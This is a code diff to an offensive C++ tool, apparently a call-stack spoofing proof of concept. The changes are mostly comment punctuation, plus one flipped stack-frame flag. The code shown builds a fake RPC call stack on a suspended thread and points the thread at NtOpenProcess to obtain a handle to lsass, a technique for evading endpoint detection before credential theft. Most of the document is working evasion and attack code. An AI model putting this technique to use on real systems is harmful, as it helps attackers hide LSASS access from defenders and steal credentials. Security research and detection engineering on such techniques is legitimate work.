@@ -187,7 +187,7 @@ std::vector<StackFrame> rpcCallStack =
     StackFrame(L"C:\\Windows\\SYSTEM32\\kernelbase.dll", 0x32ea6, 0, FALSE),
     StackFrame(L"C:\\Windows\\SYSTEM32\\lsm.dll", 0xe959, 0, TRUE),
     StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x79633, 0, TRUE),
-    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x13711, 0, TRUE),
+    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x13711, 0, FALSE),
     StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0xdd77b, 0, FALSE),
     StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x5d2ac, 0, FALSE),
     StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x5a408, 0, FALSE),
@@ -437,7 +437,7 @@ NTSTATUS InitialiseSpoofedCallstack(std::vector<StackFrame> &targetCallStack)
 
     for (auto stackFrame = targetCallStack.begin(); stackFrame != targetCallStack.end(); stackFrame++)
     {
-        // [1] Get image base for current stack frame
+        // [1] Get image base for current stack frame.
         status = GetImageBase(*stackFrame);
         if (!NT_SUCCESS(status))
         {
@@ -445,7 +445,7 @@ NTSTATUS InitialiseSpoofedCallstack(std::vector<StackFrame> &targetCallStack)
             goto Cleanup;
         }
 
-        // [2] Calculate ret address for current stack frame
+        // [2] Calculate ret address for current stack frame.
         status = CalculateReturnAddress(*stackFrame);
         if (!NT_SUCCESS(status))
         {
@@ -453,7 +453,7 @@ NTSTATUS InitialiseSpoofedCallstack(std::vector<StackFrame> &targetCallStack)
             goto Cleanup;
         }
 
-        // [3] Calculate the total stack size for ret function
+        // [3] Calculate the total stack size for ret function.
         status = CalculateFunctionStackSizeWrapper(*stackFrame);
         if (!NT_SUCCESS(status))
         {
@@ -521,10 +521,10 @@ void InitialiseFakeThreadState(CONTEXT& context, const std::vector<StackFrame> &
         // If the previous frame uses the UWOP_SET_FPREG
         // op, it will reset the stack pointer to rbp.
         // Therefore, we need to find the next function in
-        // the chain which pops rbp and make sure it writes
-        // the correct value to the stack (push rbp) so it is
-        // propagated to the frame after that needs it (otherwise
-        // stackwalk will fail). The required value is the childSP
+        // the chain which pushes rbp and make sure it writes
+        // the correct value to the stack so it is propagated
+        // to the frame after that needs it (otherwise stackwalk
+        // will fail). The required value is the childSP
         // of the function that used UWOP_SET_FPREG (i.e. the
         // value of RSP after it is done adjusting the stack and
         // before it pushes its RET address).
@@ -571,7 +571,7 @@ void InitialiseFakeThreadState(CONTEXT& context, const std::vector<StackFrame> &
         else
         {
             // [3] If normal frame, decrement total stack size
-            // and write RET address
+            // and write RET address.
             context.Rsp -= stackFrame->totalStackSize;
             PULONG64 fakeRetAddress = (PULONG64)(context.Rsp);
             *fakeRetAddress = (ULONG64)stackFrame->returnAddress;
@@ -631,14 +631,14 @@ BOOL SetPrivilege(
     LUID luid = {};
     HANDLE hToken = NULL;
 
-    // [1] Obtain handle to process token
+    // [1] Obtain handle to process token.
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
     {
         std::cout << "[-] Failed to OpenProcessToken \n";
         return FALSE;
     }
 
-    // [2] Look up supplied privilege value and set if required
+    // [2] Look up supplied privilege value and set if required.
     if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
     {
         std::cout << "[-] SetPrivilege failed: LookupPrivilegeValue error" << GetLastError() << std::endl;
@@ -779,7 +779,7 @@ int main(int argc, char* argv[])
     DWORD lsassPid = 0;
     HANDLE hLsass = 0;
 
-    // [0] Handle command line args
+    // [0] Handle command line args.
     status = HandleArgs(argc, argv, targetCallStack);
     if (!NT_SUCCESS(status))
     {
@@ -788,7 +788,7 @@ int main(int argc, char* argv[])
 
     // [1] Initialise our target call stack to spoof. This
     // will load any required dlls, calculate ret addresses,
-    // and individual stack sizes needed to mimic the call stack
+    // and individual stack sizes needed to mimic the call stack.
     std::cout << "[+] Initialising fake call stack...\n";
     status = InitialiseSpoofedCallstack(targetCallStack);
     if (!NT_SUCCESS(status))
@@ -822,7 +822,7 @@ int main(int argc, char* argv[])
     }
     std::cout << "[+] Created suspended thread\n";
 
-    // [4] Obtain context struct for suspended thread
+    // [4] Obtain context struct for suspended thread.
     context.ContextFlags = CONTEXT_FULL;
     ret = GetThreadContext(hThread, &context);
     if (!ret)
@@ -831,11 +831,11 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    // [5.1] Initialise fake thread state
+    // [5.1] Initialise fake thread state.
     std::cout << "[+] Initialising spoofed thread state...\n";
     InitialiseFakeThreadState(context, targetCallStack);
 
-    // [5.2] Set arguments for NtOpenProcess
+    // [5.2] Set arguments for NtOpenProcess.
     // RCX
     context.Rcx = (DWORD64)&hLsass;
     // RDX
@@ -852,7 +852,7 @@ int main(int argc, char* argv[])
     DWORD64 ntOpenProcessAddress = (DWORD64)GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess");
     context.Rip = ntOpenProcessAddress;
 
-    // [5.3] Set thread context
+    // [5.3] Set thread context.
     ret = SetThreadContext(hThread, &context);
     if (!ret)
     {
@@ -870,7 +870,7 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    // [7] Rock and or roll
+    // [7] Rock and or roll.
     std::cout << "[+] Resuming suspended thread...\n";
     suspendCount = ResumeThread(hThread);
     if (-1 == suspendCount)
@@ -879,7 +879,7 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    // [8] Sleep briefly
+    // [8] Sleep briefly.
     std::cout << "[+] Sleeping for 5 seconds...\n";
     Sleep(5000);
 
